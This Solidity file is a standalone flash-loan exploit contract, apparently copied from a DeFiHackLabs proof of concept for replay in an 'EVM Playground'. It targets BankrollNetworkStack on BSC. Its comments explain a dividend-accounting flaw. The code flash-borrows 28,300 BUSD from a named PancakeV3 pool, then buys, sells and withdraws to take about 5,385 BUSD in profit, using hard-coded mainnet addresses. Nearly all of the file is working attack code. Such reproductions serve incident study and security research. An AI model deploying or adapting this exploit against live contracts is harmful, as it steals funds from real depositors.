// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-06-BankrollStack).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (Bankrollstack is BaseTestWithBalanceLog; the PancakeV3 flash
// callback `pancakeV3FlashCallback` lives on the test itself, with
// attacker = address(this)), so there is no standalone exploit contract to
// deploy. This is a faithful, self-contained copy of that inline attack:
// `run()` (the recorded entrypoint) is a verbatim copy of the original
// `testExploit()` body, and `pancakeV3FlashCallback` is copied unchanged.
//
// Root cause: BankrollNetworkStack (a Bankroll-Network-style "dividend"
// Ponzi) computes each seller's payout via sell() -> allocateFees() ->
// distribute() -> profitPerShare_, where profitPerShare_ is bumped
// IMMEDIATELY inside the same call using the fee just paid, and dividends
// are valued as (profitPerShare_ * tokenBalanceLedger_[user]) / magnitude.
// A single flash-loaned buy() mints a huge token balance for the caller in
// the same transaction; immediately selling that entire balance forces the
// contract to book an entry/exit fee against the caller's own giant stake,
// inflating profitPerShare_ system-wide within the same call, and
// withdraw() pays out the resulting "dividends" — funded by the flash-loaned
// principal itself, not by real third-party deposits. Buy 28,300 BUSD,
// sell all newly-minted tokens, and withdraw() nets ~5,385.8 BUSD of
// dividends from zero starting capital (after repaying the flash loan).

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IBankrollStack {
    function donatePool(uint256 tokenAmount) external;
    function buy(uint256 tokenAmount) external returns (uint256);
    function sell(uint256 tokenAmount) external;
    function myTokens() external view returns (uint256);
    function myDividends() external view returns (uint256);
    function withdraw() external;
}

contract BankrollStackDrain {
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant PancakeV3Pool = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818;
    address constant BankrollStack = 0x16d0a151297a0393915239373897bCc955882110;

    uint256 constant flashAmount = 28300000000000000000000;

    function run() external {
        IPancakeV3Pool(PancakeV3Pool).flash(address(this), 0, flashAmount, "0x00");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 buyAmount = IERC20(BUSD).balanceOf(address(this));
        uint256 repayAmount = 28302830000000000000000;

        IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);

        IBankrollStack(BankrollStack).buy(buyAmount);
        uint256 myTokens = IBankrollStack(BankrollStack).myTokens();
        IBankrollStack(BankrollStack).sell(myTokens);
        IBankrollStack(BankrollStack).withdraw();
        IERC20(BUSD).transfer(address(PancakeV3Pool), repayAmount);
    }
}
